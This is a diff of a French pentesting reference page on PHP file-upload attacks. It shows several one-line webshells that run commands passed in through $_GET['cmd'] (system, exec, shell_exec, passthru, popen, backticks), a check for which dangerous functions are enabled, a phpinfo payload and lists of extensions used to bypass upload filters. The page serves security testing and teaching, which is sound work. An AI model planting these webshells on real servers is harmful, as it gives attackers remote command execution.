@@ -1,99 +1,151 @@
 # PHP
 
-**Facteur de risque** : RCE
+![](logo.png)
 
-## Description
+**Facteur de risque** : RCE via webshell, Information DIsclosure
 
-> **PHP: Hypertext Preprocessor**, plus connu sous son sigle **PHP**, est un "langage de programmation" libre, principalement utilisé pour produire des pages Web dynamiques via un serveur HTTP (*Apache, lighttpd, nginx...*).
+**Extension** : `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phar`, `.phps`, `.phpt`, `.pht`, `.phtm`, `.phtml`, `.inc`
 
-## Pré-requis
+**Description** : **PHP: Hypertext Preprocessor**, plus connu sous son sigle **PHP**, est un "langage de programmation" libre, principalement utilisé pour produire des pages Web dynamiques via un serveur HTTP (*Apache, lighttpd, nginx...*).
+
+## Remote Code Execution
+
+### Pré-requis
+
+- Le fichier doit être accessible après avoir été uploadé
 
 - Le serveur supporte le PHP
 
-- Pourvoir upload des fichiers
-
-- Accéder à ces fichiers
+- Les fonctions d'exécution en PHP doivent être activés
 
 - Les fichiers stockés doivent être exécutés via PHP (même pour les images)
   
   - Impossible de nos jours. La configuration par défaut de PHP consiste à exécuter l'interpréteur PHP uniquement pour les fichiers .php, à l'aide de NGinx, Apache, Lighttpd etc...
 
-## RCE
+### Payload
 
-PHP possède plusieurs fonctions qui permettent d'exécuter des commandes. Les codes PHP suivants permet d'avoir un webshell très simple en utilisant les principaux fonctions de PHP :
+PHP possède plusieurs fonctions qui permettent d'exécuter des commandes. Ces fonctions peuvent être utilisés pour avoir des webshells très basiques :
 
-```php
-<?php echo "Shell";system($_GET['cmd']); ?>
-```
+#### system
 
 ```php
-<?php echo "Shell";system($_GET['cmd']); ?>
+<?php
+echo "<pre>";
+system($_GET['cmd']);
+echo "</pre>";
+?>
 ```
+
+La fonction `system` accepte la commande comme paramètre de la fonction, puis affiche le résultat.
+
+#### exec
 
 ```php
-<?php echo "Shell";system($_GET['cmd']); ?>
+<?php
+exec($_GET['cmd'], $array);
+echo "<pre>";
+print_r($array);
+echo "</pre>";
+?>
 ```
+
+La fonction `exec` accepte la commande comme paramètre de la fonction, mais n'affiche pas de sortie. Il faut spécifier un deuxième paramètre (ici `$array`) pour avoir le résultat sous forme de tableau. Puis `print_r` est utilisé pour afficher le résultat.
+
+#### shell\_exec
 
 ```php
-<?php echo "Shell";system($_GET['cmd']); ?>
+<?php
+$output = shell_exec($_GET['cmd']);
+echo "<pre>$output</pre>"
+?>
 ```
+
+La fonction `shell_exec` accepte la commande comme paramètre de la fonction, et retourne le résultat sous forme ce chaîne. Puis `echo` est utilisé pour afficher le résultat.
+
+#### passthru
 
 ```php
-<?php echo "Shell";system($_GET['cmd']); ?>
+<?php
+passthru($_GET['cmd']);
+?>
 ```
 
-Si on accédant à ce fichier, le mot Shell apparaît, il y a de grandes chances que le code a été exécuté côté serveur.
+La fonction `passthru` accepte la commande comme paramètre de la fonction, et affiche le résultat brut.
 
-Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. Lacommande dépendra du serveur (Windows ou Linux).
+#### popen
+
+```php
+<?php
+$handle = popen($_GET['cmd'],'r');
+echo "<pre>".fread($handle,4096)."</pre>";
+pclose($handle);
+?>
+```
+
+La fonction `popen` crée un processus, qui est terminé avec `pclose`.
+
+#### proc_open
+
+A faire
+
+#### Backticks `
+
+```php
+<?php
+$output = `$_GET['cmd']`;
+echo "<pre>$output</pre>";
+?>
+```
+
+PHP exécute le contenu entre backticks comme des commandes. Puis le résultat est affiché avec `echo`, avec les balises `<pre>` pour garder le résultat préformaté.
+
+Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).
+
+### Quels fonctions sont activés ?
+
+Le code PHP suivant permet de déterminer les fonctions dangereuses autorisés :
+
+```php
+<?php
+echo "<pre>";
+print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
+echo "</pre>";
+?>
+```
+
+## Information Disclosure
+
+### Pré-requis
+
+- Le fichier doit être accessible après avoir été uploadé
+
+- Le serveur supporte le PHP
+
+### Payload
+
+La fonction `phpinfo` affiche de nombreuses informations sur la configuration de PHP, ce qui constitue une divulgation d'information.
+
+**phpinfo.php**
+
+```php
+<?php
+phpinfo();
+?>
+```
+
+## References
 
 [Web Shells 101 Using PHP (Web Shells Part 2) | Acunetix](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/)
 
-### Contournement
+[PHP: popen - Manual](https://www.php.net/manual/en/function.popen.php)
 
-#### Du code PHP dans un fichier image
+https://www.dynamicciso.com/web-shells-in-php-detection-and-prevention-part-1/
 
-Du image (GIF ou JPEG) peut contenir du code PHP. Mais il faut s'assurer que après l'upload, l'image stocké est exécuté avec du PHP. De nos jours, l'interpreteur de PHP n'exécute que les fichiers en .php.
+[security - Exploitable PHP functions - Stack Overflow](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
 
-[Setting up PHP-FastCGI and nginx? Don’t trust the tutorials: check your configuration! &raquo; Neal Poole](https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/)
+[[Résolu] Fonctions PHP plus exploitables | php | Prograide.com](https://prograide.com/pregunta/2693/fonctions-php-plus-exploitables)
 
-[security - Can a GIF/JPEG file contain runnable PHP code? - Stack Overflow](https://stackoverflow.com/questions/13250471/can-a-gif-jpeg-file-contain-runnable-php-code)
+## Todo
 
-[PHP security exploit with GIF images - PHP Classes](https://www.phpclasses.org/blog/post/67-PHP-security-exploit-with-GIF-images.html)
-
-#### Extensions PHP
-
-Trouver les extension manquantes qui peuvent être exécutées du côté serveur (ou peuvent être dangereuses du côté client)
-
-| Extension |
-| --------- |
-| .php      |
-| .phtml    |
-| .php3     |
-| .php4     |
-| .php5     |
-| .php7     |
-| .phps     |
-| .php-s    |
-| .pht      |
-| .phar     |
-| .phpt     |
-| **.pgif** |
-| .phtm     |
-
-htm
-
-shtml
-
-xhtml
-
-cgi
-
-Ajouter d'autres payload utilisant d'autre commandes PHP
-
-## Uppercase some letter(s) of the extension
-
-.pHp, .pHP5, .PhAr...
-
-## Double (or more) extension
-
-Useful to bypass misconfigured checks that test if a specific extension is just present
+- Vérifier les fonctions définies en PHP
+- Faire un webshell avec proc\_open, pcntl\_exec
